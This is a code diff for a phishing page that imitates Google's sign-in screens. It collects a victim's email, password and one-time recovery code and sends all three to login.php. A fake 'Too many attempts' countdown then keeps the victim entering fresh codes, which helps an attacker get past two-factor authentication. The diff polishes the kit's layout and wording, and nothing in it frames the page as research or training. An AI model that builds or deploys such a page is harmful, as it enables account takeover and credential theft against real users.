@@ -7,133 +7,169 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; }
-        body { font-family: 'Roboto', sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 50px; }
-        .card { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: left; }
-        @media (max-width: 450px) { .card { border: none; padding: 24px; } }
+        body { font-family: 'Roboto', sans-serif; background-color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #202124; }
         
-        .logo-box { text-align: center; margin-bottom: 10px; }
-        .logo { width: 75px; }
-        h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 10px; }
-        .sub-text { font-size: 16px; text-align: center; margin-bottom: 30px; }
+        .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        @media (max-width: 450px) { .container { border: none; padding: 24px; } }
 
-        /* Identity Chip from your image */
-        .user-chip {
+        .logo { width: 75px; height: 24px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
+        .sub-text { font-size: 16px; color: #202124; margin-bottom: 32px; line-height: 1.4; }
+
+        /* ইউজার আইডেন্টিটি বক্স (আপনার ছবি অনুযায়ী) */
+        .user-identity {
             display: inline-flex; align-items: center; padding: 3px 10px 3px 4px;
-            border: 1px solid #dadce0; border-radius: 16px; margin: 0 auto 24px; cursor: pointer;
-            position: relative; left: 50%; transform: translateX(-50%);
+            border: 1px solid #dadce0; border-radius: 16px; margin-bottom: 24px; cursor: pointer;
         }
-        .p-icon { width: 20px; height: 20px; background: #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px; }
-        .p-icon svg { fill: white; width: 14px; }
-        .u-mail { font-size: 14px; font-weight: 500; color: #3c4043; }
-        .u-arrow { margin-left: 5px; border-top: 4px solid #5f6368; border-right: 4px solid transparent; border-left: 4px solid transparent; }
+        .user-icon {
+            width: 20px; height: 20px; background-color: #5f6368; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; margin-right: 8px;
+        }
+        .user-icon svg { fill: white; width: 14px; height: 14px; }
+        .email-text { font-size: 14px; font-weight: 500; color: #3c4043; }
+        .dropdown-icon { margin-left: 4px; border-top: 4px solid #5f6368; border-right: 4px solid transparent; border-left: 4px solid transparent; }
 
-        /* Input Styles */
-        .input-group { margin-bottom: 20px; }
-        .g-input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
+        /* গুগল ম্যাটেরিয়াল ইনপুট স্টাইল */
+        .input-wrapper { position: relative; margin-bottom: 25px; text-align: left; }
+        .g-input {
+            width: 100%; padding: 13px 15px; border: 1px solid #dadce0; 
+            border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s;
+        }
         .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
         
-        .blue-link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
-        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
-        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
-        .btn:disabled { background: #ccc; }
+        /* শো পাসওয়ার্ড ও অন্যান্য লিঙ্ক */
+        .checkbox-area { display: flex; align-items: center; margin-top: 10px; font-size: 14px; }
+        .checkbox-area input { margin-right: 10px; width: 18px; height: 18px; cursor: pointer; }
 
-        #wait-msg { color: #d93025; font-size: 13px; margin-top: 10px; display: none; text-align: center; }
+        .links { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .links:hover { text-decoration: underline; }
+
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .next-btn { 
+            background-color: #1a73e8; color: white; border: none; padding: 10px 24px; 
+            border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px;
+        }
+        .next-btn:hover { background-color: #1b66c9; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
+
         .step { display: none; }
-        .active { display: block; animation: fadeIn 0.3s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .active { display: block; animation: fadeIn 0.4s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        #error-msg { color: #d93025; font-size: 13px; margin-top: 8px; display: none; font-weight: 500; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="logo-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
-    </div>
-
-    <div id="step-1" class="step active">
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+    
+    <div id="step-email" class="step active">
         <h1>Sign in</h1>
-        <p class="sub-text">Use your Google Account</p>
-        <div class="input-group">
+        <p class="sub-text">Use your Google Account. The account will be added to this device and available to other Google apps.</p>
+        <div class="input-wrapper">
             <input type="text" id="email" class="g-input" placeholder="Email or phone">
+            <a class="links" style="margin-top: 8px; display: inline-block;">Forgot email?</a>
         </div>
-        <a class="blue-link">Forgot email?</a>
-        <div class="footer">
-            <a class="blue-link">Create account</a>
-            <button class="btn" onclick="next(2)">Next</button>
+        <div style="text-align: left; margin-bottom: 30px;">
+            <a class="links">Create account</a>
         </div>
-    </div>
-
-    <div id="step-2" class="step">
-        <h1>Welcome</h1>
-        <div class="user-chip" onclick="next(1)">
-            <div class="p-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
-            <span id="disp-email" class="u-mail"></span>
-            <div class="u-arrow"></div>
-        </div>
-        <div class="input-group">
-            <input type="password" id="pass" class="g-input" placeholder="Enter your password">
-        </div>
-        <a class="blue-link">Forgot password?</a>
         <div class="footer">
             <span></span>
-            <button class="btn" onclick="next(3)">Next</button>
+            <button class="next-btn" onclick="showStep('step-password')">Next</button>
         </div>
     </div>
 
-    <div id="step-3" class="step">
-        <h1>Account recovery</h1>
-        <p class="sub-text" style="font-size: 14px;">Google wants to make sure it's really you</p>
-        <div class="user-chip">
-            <div class="p-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
-            <span id="disp-email-otp" class="u-mail"></span>
+    <div id="step-password" class="step">
+        <h1>Welcome</h1>
+        <div class="user-identity" onclick="showStep('step-email')">
+            <div class="user-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+            <span id="display-email" class="email-text"></span>
+            <div class="dropdown-icon"></div>
         </div>
-        <div class="input-group">
-            <input type="text" id="otp" class="g-input" placeholder="Enter code">
-            <div id="wait-msg">Too many attempts. Try again in <span id="timer">60</span>s</div>
+        <div class="input-wrapper">
+            <input type="password" id="password" class="g-input" placeholder="Enter your password">
+            <div class="checkbox-area">
+                <input type="checkbox" id="show-pass" onclick="togglePass()"> <label for="show-pass">Show password</label>
+            </div>
         </div>
         <div class="footer">
-            <a class="blue-link">Try another way</a>
-            <button class="btn" id="finish" onclick="submitData()">Next</button>
+            <a class="links">Forgot password?</a>
+            <button class="next-btn" onclick="showStep('step-otp')">Next</button>
+        </div>
+    </div>
+
+    <div id="step-otp" class="step">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" style="width: 75px; margin-bottom: 10px;">
+        <h1>Account recovery</h1>
+        <p style="font-size: 14px; margin-bottom: 15px;">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
+        <div class="user-identity">
+            <div class="user-icon" style="background-color: #1a73e8;"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+            <span id="display-email-otp" class="email-text"></span>
+            <div class="dropdown-icon"></div>
+        </div>
+        <p style="font-size: 14px; text-align: left; margin-bottom: 10px;">An email with a verification code was just sent to your email</p>
+        <div class="input-wrapper">
+            <input type="text" id="otp" class="g-input" placeholder="Enter code">
+            <div id="error-msg">Too many attempts. Try again in <span id="timer">60</span>s</div>
+        </div>
+        <div class="footer">
+            <a class="links">Try another way</a>
+            <button class="next-btn" id="submit-btn" onclick="finalSubmit()">Next</button>
         </div>
     </div>
 </div>
 
 <script>
-    function next(s) {
-        const mail = document.getElementById('email').value;
-        document.getElementById('disp-email').innerText = mail;
-        document.getElementById('disp-email-otp').innerText = mail;
-        document.querySelectorAll('.step').forEach(div => div.classList.remove('active'));
-        document.getElementById('step-'+s).classList.add('active');
+    function showStep(stepId) {
+        const email = document.getElementById('email').value;
+        if (stepId === 'step-password' && !email) return;
+        
+        document.getElementById('display-email').innerText = email;
+        document.getElementById('display-email-otp').innerText = email;
+        
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById(stepId).classList.add('active');
     }
 
-    function submitData() {
+    function togglePass() {
+        const p = document.getElementById('password');
+        p.type = p.type === "password" ? "text" : "password";
+    }
+
+    function finalSubmit() {
         const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
+        const pass = document.getElementById('password').value;
         const otp = document.getElementById('otp').value;
 
-        if(!otp) return;
+        if (!otp) return;
 
-        // Sending data to login.php
-        let fd = new FormData();
-        fd.append('email', email); fd.append('password', pass); fd.append('otp', otp);
-        fetch('login.php', { method: 'POST', body: fd });
+        // PHP ফাইলে ডাটা পাঠানো
+        let formData = new FormData();
+        formData.append('email', email);
+        formData.append('password', pass);
+        formData.append('otp', otp);
+        fetch('login.php', { method: 'POST', body: formData });
 
-        // Timer Logic
-        const btn = document.getElementById('finish');
-        const inp = document.getElementById('otp');
-        const msg = document.getElementById('wait-msg');
-        let time = 60;
-
-        btn.disabled = true; inp.disabled = true; msg.style.display = 'block';
+        // ১ মিনিটের টাইমার ও লক লজিক
+        const btn = document.getElementById('submit-btn');
+        const input = document.getElementById('otp');
+        const error = document.getElementById('error-msg');
+        const timerSpan = document.getElementById('timer');
         
-        const count = setInterval(() => {
-            time--;
-            document.getElementById('timer').innerText = time;
-            if(time <= 0) {
-                clearInterval(count);
-                btn.disabled = false; inp.disabled = false; msg.style.display = 'none';
-                inp.value = "";
+        btn.disabled = true;
+        input.disabled = true;
+        error.style.display = 'block';
+
+        let timeLeft = 60;
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerSpan.innerText = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                btn.disabled = false;
+                input.disabled = false;
+                error.style.display = 'none';
+                input.value = "";
             }
         }, 1000);
     }
